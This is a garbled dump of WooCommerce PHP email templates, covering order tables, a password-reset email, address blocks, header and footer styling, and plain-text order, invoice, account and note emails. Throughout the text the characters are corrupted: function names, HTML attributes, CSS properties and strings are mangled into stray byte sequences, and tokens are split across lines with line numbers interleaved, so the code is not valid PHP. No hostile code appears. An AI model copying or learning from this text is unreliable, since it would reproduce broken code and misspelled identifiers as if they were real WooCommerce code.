 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	gth
>

26 </
	gŒ
>

27 </
	gth—d
>

28 <
	gtbody
>

29 <?
php
 
echo
 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
$Üd”
->
is_dowÆßd_³rm™‹d
(), 
Œue
, ( $Üd”->
¡©us
=='´oûssšg' ) ?ru: 
çl£
 ); ?>

30 </
	gtbody
>

31 <
	gtfoÙ
>

32 <?
php


33 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

34 
$i
 = 0;

35 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

36 
$i
++;

37 ?><
Œ
>

38 <
th
 
scİe
="row" 
cŞ¥ª
="2" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

39 <
td
 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['value']; ?></td>

40 </
Œ
><?
php


42 
	}
}

44 </
	gtfoÙ
>

45 </
	gbË
>

47 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

49 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

51 <
	gh2
><?
php
 
_e
( 'Customer details', 'woocommerce' ); ?></h2>

53 <?
php
 ià(
	g$Üd”
->
	gblšg_ema
) : ?>

54 <
p
><
¡rÚg
><?
php
 
_e
Ğ'Ema:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_ema
; ?></
	gp
>

55 <?
php
 
	g’dif
; ?>

56 <?
php
 ià(
	g$Üd”
->
	gblšg_phÚe
) : ?>

57 <
p
><
¡rÚg
><?
php
 
_e
Ğ'T–:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_phÚe
; ?></
	gp
>

58 <?
php
 
	g’dif
; ?>

60 <?
php
 
wc_g‘_‹m¶©e
Ğ'emas/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) ); ?>

62 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/customer-reset-password.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 ); ?>

14 <
	gp
><?
php
 
_e
( 'Someone„equestedhathe…assword be„eset forhe following‡ccount:', 'woocommerce' ); ?></p>

15 <
	gp
><?
php
 
´štf
Ğ
__
Ğ'U£ºame: %s', 'woocomm”û' ), 
$u£r_logš
 ); ?></p>

16 <
	gp
><?
php
 
_e
( 'Ifhis was‡ mistake, just ignorehisƒmail‡nd‚othing will happen.', 'woocommerce' ); ?></p>

17 <
	gp
><?
php
 
_e
( 'To„eset your…assword, visithe following‡ddress:', 'woocommerce' ); ?></p>

18 <
	gp
>

19 <
a
 
	gh»f
="<?phpƒchoƒsc_url(‡dd_query_arg(‡rray( 'key' => $reset_key, 'login' =>„awurlencode( $user_login ) ), wc_get_endpoint_url( 'lost-password', '', get_permalink( wc_get_page_id( 'myaccount' ) ) ) ) ); ?>">

20 <?
php
 
_e
Ğ'Click h”tØ»£ˆyou¸·sswÜd', 'woocomm”û' ); ?></
	ga
>

21 </
	gp
>

22 <
	gp
></p>

24 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/email-addresses.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 ?><
bË
 
	gûÎ¥acšg
="0" 
ûÎ·ddšg
="0" 
¡yË
="width: 100%; v”tiÿl-®ign:İ;" 
bÜd”
="0">

14 <
Œ
>

16 <
td
 
v®ign
="tİ" 
width
="50%">

18 <
h3
><?
php
 
_e
Ğ'Blšg‡dd»ss', 'woocomm”û' ); ?></
	gh3
>

20 <
	gp
><?
php
 
echo
 
	g$Üd”
->
g‘_fÜm©‹d_blšg_add»ss
(); ?></p>

22 </
	gtd
>

24 <?
php
 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_sh_to_blšg_add»ss_Úly' ) ==ğ'no' && ( 
$shpšg
 = 
$Üd”
->
	$g‘_fÜm©‹d_shpšg_add»ss
() ) ) : ?>

26 <
td
 
v®ign
="tİ" 
width
="50%">

28 <
h3
><?
php
 
	`_e
( 'Shipping‡ddress', 'woocommerce' ); ?></h3>

30 <
p
><?
php
 
echo
 
$shpšg
; ?></p>

32 </
td
>

34 <?
php
 
’dif
; ?>

36 </
Œ
>

38 </
bË
>

	@templates/emails/email-footer.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
	g$ba£
 = 
g‘_İtiÚ
( 'woocommerce_email_base_color' );

15 
	g$ba£_ligh‹r_40
 = 
wc_hex_ligh‹r
Ğ
$ba£
, 40 );

18 
	g$‹m¶©e_foÙ”
 = "

19 
bÜd”
-
tİ
:0;

20 -
	gwebk™
-
	gbÜd”
-
	g¿dius
:6
px
;

23 
	g$üed™
 = "

24 
bÜd”
:0;

25 
	gcŞÜ
: 
$ba£_ligh‹r_40
;

26 
	gfÚt
-
	gçmy
: 
ArŸl
;

27 
	gfÚt
-
	gsize
:12
px
;

28 
	glše
-
	gheight
:125%;

29 
	g‹xt
-
	g®ign
:
ûÁ”
;

32 </
	gdiv
>

33 </
	gtd
>

34 </
	gŒ
>

35 </
	gbË
>

36 <!-- 
End
 
	gCÚ‹Á
 -->

37 </
	gtd
>

38 </
	gŒ
>

39 </
	gbË
>

40 <!-- 
End
 
	gBody
 -->

41 </
	gtd
>

42 </
	gŒ
>

43 <
	gŒ
>

44 <
td
 
	g®ign
="ûÁ”" 
v®ign
="top">

45 <!-- 
FoÙ”
 -->

46 <
bË
 
bÜd”
="0" 
ûÎ·ddšg
="10" 
ûÎ¥acšg
="0" 
width
="600" 
id
="‹m¶©e_foÙ”" 
¡yË
="<?phpƒcho $template_footer; ?>">

47 <
Œ
>

48 <
td
 
v®ign
="top">

49 <
bË
 
bÜd”
="0" 
ûÎ·ddšg
="10" 
ûÎ¥acšg
="0" 
width
="100%">

50 <
Œ
>

51 <
td
 
cŞ¥ª
="2" 
v®ign
="middË" 
id
="üed™" 
¡yË
="<?phpƒcho $credit; ?>">

52 <?
php
 
echo
 
w·utİ
Ğ
wp_k£s_po¡
Ğ
w±exturize
Ğ
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) ) ) ) ); ?>

53 </
	gtd
>

54 </
	gŒ
>

55 </
	gbË
>

56 </
	gtd
>

57 </
	gŒ
>

58 </
	gbË
>

59 <!-- 
End
 
	gFoÙ”
 -->

60 </
	gtd
>

61 </
	gŒ
>

62 </
	gbË
>

63 </
	gtd
>

64 </
	gŒ
>

65 </
	gbË
>

66 </
	gdiv
>

67 </
	gbody
>

68 </
	ghtml
>

	@templates/emails/email-header.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
	g$bg
 = 
g‘_İtiÚ
( 'woocommerce_email_background_color' );

14 
	g$body
 = 
g‘_İtiÚ
( 'woocommerce_email_body_background_color' );

15 
	g$ba£
 = 
g‘_İtiÚ
( 'woocommerce_email_base_color' );

16 
	g$ba£_‹xt
 = 
wc_light_Ü_d¬k
Ğ
$ba£
, '#202020', '#ffffff' );

17 
	g$‹xt
 = 
g‘_İtiÚ
( 'woocommerce_email_text_color' );

19 
	g$bg_d¬k”_10
 = 
wc_hex_d¬k”
Ğ
$bg
, 10 );

20 
	g$ba£_ligh‹r_20
 = 
wc_hex_ligh‹r
Ğ
$ba£
, 20 );

21 
	g$‹xt_ligh‹r_20
 = 
wc_hex_ligh‹r
Ğ
$‹xt
, 20 );

24 
	g$w¿µ”
 = "

25 
background
-
cŞÜ
: " .ƒsc_attr( $bg ) . ";

26 
	gwidth
:100%;

27 -
	gwebk™
-
	g‹xt
-
	gsize
-
	gadju¡
:
nÚe
 !
impÜÁ
;

28 
	gm¬gš
:0;

29 
	g·ddšg
: 70
px
 0 70px 0;

31 
	g$‹m¶©e_cÚš”
 = "

32 -
webk™
-
box
-
shadow
:0 0 0 3
px
 
rgba
(0,0,0,0.025è!
	gimpÜÁ
;

33 
	gbox
-
	gshadow
:0 0 0 3
px
 
rgba
(0,0,0,0.025è!
	gimpÜÁ
;

34 -
	gwebk™
-
	gbÜd”
-
	g¿dius
:6
px
 !
impÜÁ
;

35 
	gbÜd”
-
	g¿dius
:6
px
 !
impÜÁ
;

36 
	gbackground
-
	gcŞÜ
: " .ƒsc_attr( $body ) . ";

37 
	gbÜd”
: 1
px
 
sŞid
 
$bg_d¬k”_10
;

38 -
	gwebk™
-
	gbÜd”
-
	g¿dius
:6
px
 !
impÜÁ
;

39 
	gbÜd”
-
	g¿dius
:6
px
 !
impÜÁ
;

41 
	g$‹m¶©e_h—d”
 = "

42 
background
-
cŞÜ
: " .ƒsc_attr( $base ) .";

43 
	gcŞÜ
: 
$ba£_‹xt
;

44 -
	gwebk™
-
	gbÜd”
-
	gtİ
-
	gËá
-
	g¿dius
:6
px
 !
impÜÁ
;

45 -
	gwebk™
-
	gbÜd”
-
	gtİ
-
	gright
-
	g¿dius
:6
px
 !
impÜÁ
;

46 
	gbÜd”
-
	gtİ
-
	gËá
-
	g¿dius
:6
px
 !
impÜÁ
;

47 
	gbÜd”
-
	gtİ
-
	gright
-
	g¿dius
:6
px
 !
impÜÁ
;

48 
	gbÜd”
-
	gbÙtom
: 0;

49 
	gfÚt
-
	gçmy
:
ArŸl
;

50 
	gfÚt
-
	gweight
:
bŞd
;

51 
	glše
-
	gheight
:100%;

52 
	gv”tiÿl
-
	g®ign
:
middË
;

54 
	g$body_cÚ‹Á
 = "

55 
background
-
cŞÜ
: " .ƒsc_attr( $body ) . ";

56 -
	gwebk™
-
	gbÜd”
-
	g¿dius
:6
px
 !
impÜÁ
;

57 
	gbÜd”
-
	g¿dius
:6
px
 !
impÜÁ
;

59 
	g$body_cÚ‹Á_šÃr
 = "

60 
cŞÜ
: 
$‹xt_ligh‹r_20
;

61 
	gfÚt
-
	gçmy
:
ArŸl
;

62 
	gfÚt
-
	gsize
:14
px
;

63 
	glše
-
	gheight
:150%;

64 
	g‹xt
-
	g®ign
:
Ëá
;

66 
	g$h—d”_cÚ‹Á_h1
 = "

67 
cŞÜ
: " .ƒsc_attr( $base_text ) . ";

68 
	gm¬gš
:0;

69 
	g·ddšg
: 28
px
 24px;

70 
	g‹xt
-
	gshadow
: 0 1
px
 0 
$ba£_ligh‹r_20
;

71 
	gdi¥Ïy
:
block
;

72 
	gfÚt
-
	gçmy
:
ArŸl
;

73 
	gfÚt
-
	gsize
:30
px
;

74 
	gfÚt
-
	gweight
:
bŞd
;

75 
	g‹xt
-
	g®ign
:
Ëá
;

76 
	glše
-
	gheight
: 150%;

79 <!
DOCTYPE
 
	ghtml
>

80 <
	ghtml
>

81 <
	gh—d
>

82 <
m‘a
 
	gh‰p
-
	gequiv
="CÚ‹Á-Ty³" 
cÚ‹Á
="text/html; charset=UTF-8" />

83 <
t™Ë
><?
php
 
echo
 
g‘_blogšfo
Ğ'Çme' ); ?></
	gt™Ë
>

84 </
	gh—d
>

85 <
body
 
	gËám¬gš
="0" 
m¬gšwidth
="0" 
tİm¬gš
="0" 
m¬gšheight
="0" 
off£t
="0">

86 <
div
 
¡yË
="<?phpƒcho $wrapper; ?>">

87 <
bË
 
bÜd”
="0" 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
height
="100%" 
width
="100%">

88 <
Œ
>

89 <
td
 
®ign
="ûÁ”" 
v®ign
="top">

90 <?
php


91 iàĞ
$img
 = 
g‘_İtiÚ
( 'woocommerce_email_header_image' ) ) {

92 
echo
 '<°¡yË="m¬gš-tİ:0;"><img src="' . 
esc_u¾
Ğ
$img
 ) . '"‡É="' . 
g‘_blogšfo
( 'name' ) . '" /></p>';

95 <
bË
 
	gbÜd”
="0" 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
width
="600" 
id
="‹m¶©e_cÚš”" 
¡yË
="<?phpƒcho $template_container; ?>">

96 <
Œ
>

97 <
td
 
®ign
="ûÁ”" 
v®ign
="top">

98 <!-- 
H—d”
 -->

99 <
bË
 
bÜd”
="0" 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
width
="600" 
id
="‹m¶©e_h—d”" 
¡yË
="<?ph°echØ$‹m¶©e_h—d”; ?>" 
bgcŞÜ
="<?phpƒcho $base; ?>">

100 <
Œ
>

101 <
td
>

102 <
h1
 
¡yË
="<?ph°echØ$h—d”_cÚ‹Á_h1; ?>"><?
php
 
echo
 
$ema_h—dšg
; ?></
	gh1
>

104 </
	gtd
>

105 </
	gŒ
>

106 </
	gbË
>

107 <!-- 
End
 
	gH—d”
 -->

108 </
	gtd
>

109 </
	gŒ
>

110 <
	gŒ
>

111 <
td
 
	g®ign
="ûÁ”" 
v®ign
="top">

112 <!-- 
Body
 -->

113 <
bË
 
bÜd”
="0" 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
width
="600" 
id
="template_body">

114 <
Œ
>

115 <
td
 
v®ign
="tİ" 
¡yË
="<?phpƒcho $body_content; ?>">

116 <!-- 
CÚ‹Á
 -->

117 <
bË
 
bÜd”
="0" 
ûÎ·ddšg
="20" 
ûÎ¥acšg
="0" 
width
="100%">

118 <
Œ
>

119 <
td
 
v®ign
="top">

120 <
div
 
¡yË
="<?phpƒcho $body_content_inner; ?>">

	@templates/emails/email-order-items.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

14 
glob®
 
	g$woocomm”û
;

16 
	$fÜ—ch
 ( 
$™ems
 
as
 
$™em
 ) :

17 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_´oduù', 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 ), $item );

18 
$™em_m‘a
 = 
Ãw
 
	`WC_Ord”_I‹m_M‘a
Ğ
$™em
['™em_m‘a'], 
$_´oduù
 );

20 <
Œ
>

21 <
td
 
¡yË
="‹xt-®ign:Ëá; v”tiÿl-®ign:middË; bÜd”: 1px sŞid #“e; wÜd-w¿p:b»ak-wÜd;"><?
php


24 iàĞ
$show_image
 ) {

25 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_thumbÇ', '<img src="' . ( 
$_´oduù
->
	`g‘_image_id
(è? 
	`cu¼’t
Ğ
	`wp_g‘_©chm’t_image_¤c
Ğ$_´oduù->g‘_image_id(), 'thumbÇ'èè: 
	`wc_¶aûhŞd”_img_¤c
(èè.'"‡É="' . 
	`__
Ğ'Produù Image', 'woocomm”û' ) . '" height="' . 
	`esc_©Œ
Ğ
$image_size
[1] ) . '" width="' .ƒsc_©ŒĞ$image_size[0] ) . '" styË="v”tiÿl-®ign:middË; m¬gš-right: 10px;" />', 
$™em
 );

26 
	}
}

29 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_Çme', 
$™em
['name'], $item );

32 iàĞ
	g$show_sku
 && 
is_objeù
Ğ
$_´oduù
 ) && 
	g$_´oduù
->
	$g‘_sku
() ) {

33 
echo
 ' (#' . 
$_´oduù
->
	`g‘_sku
() . ')';

34 
	}
}

37 iàĞ
	g$show_dowÆßd_lšks
 && 
is_objeù
Ğ
$_´oduù
 ) && 
	g$_´oduù
->
exi¡s
(è&& $_´oduù->
	$is_dowÆßdabË
() ) {

39 
$dowÆßd_fes
 = 
$Üd”
->
	`g‘_™em_dowÆßds
Ğ
$™em
 );

40 
$i
 = 0;

42 
	`fÜ—ch
 ( 
$dowÆßd_fes
 
as
 
$dowÆßd_id
 => 
$fe
 ) {

43 
$i
++;

45 iàĞ
	`couÁ
Ğ
$dowÆßd_fes
 ) > 1 ) {

46 
$´efix
 = 
	`¥rštf
Ğ
	`__
Ğ'DowÆßd %d', 'woocomm”û' ), 
$i
 );

47 } 
	`–£if
 ( 
$i
 == 1 ) {

48 
$´efix
 = 
	`__
( 'Download', 'woocommerce' );

51 
echo
 '<br/><sm®l>' . 
$´efix
 . ': <¨h»f="' . 
	`esc_u¾
Ğ
$fe
['dowÆßd_u¾'] ) . '"¬g‘="_bÏnk">' . 
	`esc_html
( $file['name'] ) . '</a></small>';

53 
	}
}

56 iàĞ
	g$™em_m‘a
->
	gm‘a
 ) {

57 
	gecho
 '<br/><sm®l>' . 
Æ2br
Ğ
$™em_m‘a
->
di¥Ïy
Ğ
Œue
,rue ) ) . '</small>';

60 ?></
	gtd
>

61 <
td
 
	g¡yË
="‹xt-®ign:Ëá; v”tiÿl-®ign:middË; bÜd”: 1px sŞid #“e;"><?
php
 
echo
 
$™em
['qty'] ;?></
	gtd
>

62 <
td
 
	g¡yË
="‹xt-®ign:Ëá; v”tiÿl-®ign:middË; bÜd”: 1px sŞid #“e;"><?
php
 
echo
 
$Üd”
->
g‘_fÜm©‹d_lše_subtÙ®
Ğ
$™em
 ); ?></
	gtd
>

63 </
	gŒ
>

65 <?
php
 iàĞ
	g$show_purcha£_nÙe
 && 
is_objeù
Ğ
$_´oduù
 ) && 
	g$purcha£_nÙe
 = 
g‘_po¡_m‘a
Ğ$_´oduù->
id
, '_purcha£_nÙe', 
Œue
 ) ) : ?>

66 <
Œ
>

67 <
td
 
cŞ¥ª
="3" 
¡yË
="‹xt-®ign:Ëá; v”tiÿl-®ign:middË; bÜd”: 1px sŞid #“e;"><?
php
 
echo
 
­¶y_f‹rs
Ğ'the_cÚ‹Á', 
$purcha£_nÙe
 ); ?></
	gtd
>

68 </
	gŒ
>

69 <?
php
 
	g’dif
; ?>

71 <?
php
 
	g’dfÜ—ch
; ?>

	@templates/emails/plain/admin-new-order.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 
echo
 
¥rštf
Ğ
__
Ğ'You hav»ûived‡ÀÜd” from %s. Theœ ord” i a fŞlows:', 'woocomm”û' ), 
$Üd”
->
blšg_fœ¡_Çme
 . ' ' . $Üd”->
blšg_Ï¡_Çme
 ) . "\n\n";

15 
	gecho
 "****************************************************\n\n";

17 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

19 
echo
 
¥rštf
Ğ
__
Ğ'Ord”‚umb”: %s', 'woocomm”û'), 
$Üd”
->
g‘_Üd”_numb”
() ) . "\n";

20 
echo
 
¥rštf
Ğ
__
Ğ'Ord”†šk: %s', 'woocomm”û'), 
admš_u¾
Ğ'po¡.php?po¡=' . 
$Üd”
->
id
 . '&action=edit' ) ) . "\n";

21 
echo
 
¥rštf
Ğ
__
Ğ'Ord” d©e: %s', 'woocomm”û'), 
d©e_i18n
Ğ__Ğ'jS F Y', 'woocomm”û' ), 
¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ) ) . "\n";

23 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

25 
	gecho
 "\n" . 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
çl£
, 
Œue
, '', '', '',rue );

27 
	gecho
 "----------\n\n";

29 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

30 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

31 
echo
 
$tÙ®
['label'] . "\t " . $total['value'] . "\n";

33 
	}
}

35 
	gecho
 "\n****************************************************\n\n";

37 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

39 
echo
 
__
( 'Customer details', 'woocommerce' ) . "\n";

41 iàĞ
	g$Üd”
->
	gblšg_ema
 )

42 
echo
 
__
Ğ'Ema:', 'woocomm”û' );ƒchØ
	g$Üd”
->
	gblšg_ema
 . "\n";

44 iàĞ
	g$Üd”
->
	gblšg_phÚe
 )

45 
echo
 
__
Ğ'T–:', 'woocomm”û' ); ?> <?
php
ƒchØ
	g$Üd”
->
	gblšg_phÚe
 . "\n";

47 
wc_g‘_‹m¶©e
Ğ'emas/¶aš/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) );

49 
	gecho
 "\n****************************************************\n\n";

51 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/customer-completed-order.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 
echo
 
¥rštf
Ğ
__
Ğ"H˜th”e. You¸»ûÁ ord” oÀ% ha b“Àcom¶‘ed. You¸Üd” d‘a ¬showÀb–ow fÜ you¸»ã»nû:", 'woocomm”û' ), 
g‘_İtiÚ
( 'blogname' ) ) . "\n\n";

15 
	gecho
 "****************************************************\n\n";

17 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

19 
echo
 
¥rštf
Ğ
__
Ğ'Ord”‚umb”: %s', 'woocomm”û'), 
$Üd”
->
g‘_Üd”_numb”
() ) . "\n";

20 
echo
 
¥rštf
Ğ
__
Ğ'Ord” d©e: %s', 'woocomm”û'), 
d©e_i18n
Ğ
wc_d©e_fÜm©
(), 
¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ) ) . "\n";

22 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

24 
	gecho
 "\n" . 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
Œue
, 
çl£
,rue, '', '',rue );

26 
	gecho
 "----------\n\n";

28 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

29 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

30 
echo
 
$tÙ®
['label'] . "\t " . $total['value'] . "\n";

32 
	}
}

34 
	gecho
 "\n****************************************************\n\n";

36 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

38 
echo
 
__
( 'Your details', 'woocommerce' ) . "\n\n";

40 iàĞ
	g$Üd”
->
	gblšg_ema
 )

41 
echo
 
__
Ğ'Ema:', 'woocomm”û' );ƒchØ
	g$Üd”
->
	gblšg_ema
 . "\n";

43 iàĞ
	g$Üd”
->
	gblšg_phÚe
 )

44 
echo
 
__
Ğ'T–:', 'woocomm”û' ); ?> <?
php
ƒchØ
	g$Üd”
->
	gblšg_phÚe
 . "\n";

46 
wc_g‘_‹m¶©e
Ğ'emas/¶aš/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) );

48 
	gecho
 "\n****************************************************\n\n";

50 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/customer-invoice.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 iàĞ
	g$Üd”
->
	g¡©us
 == 'pending' )

14 
echo
 
¥rštf
Ğ
__
Ğ'AÀÜd” ha b“Àü—‹d fÜ you oÀ%s. TØ·y fÜhi Üd”…Ëa£ u£hfŞlowšg†šk: %s', 'woocomm”û' ), 
g‘_blogšfo
Ğ'Çme' ), 
$Üd”
->
g‘_checkout_·ym’t_u¾
() ) . "\n\n";

16 
	gecho
 "****************************************************\n\n";

18 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

20 
echo
 
¥rštf
Ğ
__
Ğ'Ord”‚umb”: %s', 'woocomm”û'), 
$Üd”
->
g‘_Üd”_numb”
() ) . "\n";

21 
echo
 
¥rštf
Ğ
__
Ğ'Ord” d©e: %s', 'woocomm”û'), 
d©e_i18n
Ğ
wc_d©e_fÜm©
(), 
¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ) ) . "\n";

23 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

25 
	gecho
 "\n";

27  
	g$Üd”
->
	g¡©us
 ) {

29 
echo
 
$Üd”
->
ema_Üd”_™ems_bË
Ğ$Üd”->
is_dowÆßd_³rm™‹d
(), 
çl£
, 
Œue
, '', '',rue );

32 
echo
 
$Üd”
->
ema_Üd”_™ems_bË
Ğ$Üd”->
is_dowÆßd_³rm™‹d
(), 
Œue
,rue, '', '',rue );

35 
echo
 
$Üd”
->
ema_Üd”_™ems_bË
Ğ$Üd”->
is_dowÆßd_³rm™‹d
(), 
Œue
, 
çl£
, '', '',rue );

39 
	gecho
 "----------\n\n";

41 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

42 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

43 
echo
 
$tÙ®
['label'] . "\t " . $total['value'] . "\n";

45 
	}
}

47 
	gecho
 "\n****************************************************\n\n";

49 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

51 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/customer-new-account.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 
echo
 
¥rštf
Ğ
__
Ğ"Thªk fÜ c»©šg‡ÀaccouÁ oÀ%s. You¸u£ºami <¡rÚg>%s</¡rÚg>.", 'woocomm”û' ), 
$blogÇme
, 
$u£r_logš
 ) . "\n\n";

15 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_»gi¡¿tiÚ_g’”©e_·sswÜd' ) ==ğ'yes' && 
$·sswÜd_g’”©ed
 )

16 
echo
 
¥rštf
Ğ
__
Ğ"You¸·sswÜd i <¡rÚg>%s</¡rÚg>.", 'woocomm”û' ), 
$u£r_·ss
 ) . "\n\n";

18 
echo
 
¥rštf
Ğ
__
Ğ'You cª‡cûs you¸accouÁ‡»¨tØv›w you¸Üd” ªd chªgyou¸·sswÜd h”e: %s.', 'woocomm”û' ), 
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'myaccount' ) ) ) . "\n\n";

20 
	gecho
 "\n****************************************************\n\n";

22 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/customer-note.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 
echo
 
__
( "Hello,‡‚ote has just been‡ddedo your order:", 'woocommerce' ) . "\n\n";

15 
	gecho
 "----------\n\n";

17 
echo
 
w±exturize
Ğ
$cu¡om”_nÙe
 ) . "\n\n";

19 
	gecho
 "----------\n\n";

21 
echo
 
__
( "For your„eference, your order details‡re shown below.", 'woocommerce' ) . "\n\n";

23 
	gecho
 "****************************************************\n\n";

25 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

27 
echo
 
¥rštf
Ğ
__
Ğ'Ord”‚umb”: %s', 'woocomm”û'), 
$Üd”
->
g‘_Üd”_numb”
() ) . "\n";

28 
echo
 
¥rštf
Ğ
__
Ğ'Ord” d©e: %s', 'woocomm”û'), 
d©e_i18n
Ğ
wc_d©e_fÜm©
(), 
¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ) ) . "\n";

30 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

32 
	gecho
 "\n" . 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
$Üd”
->
is_dowÆßd_³rm™‹d
(), 
Œue
, '', '', '',rue );

34 
	gecho
 "----------\n\n";

36 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

37 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

38 
echo
 
$tÙ®
['label'] . "\t " . $total['value'] . "\n";

40 
	}
}

42 
	gecho
 "\n****************************************************\n\n";

44 
do_aùiÚ
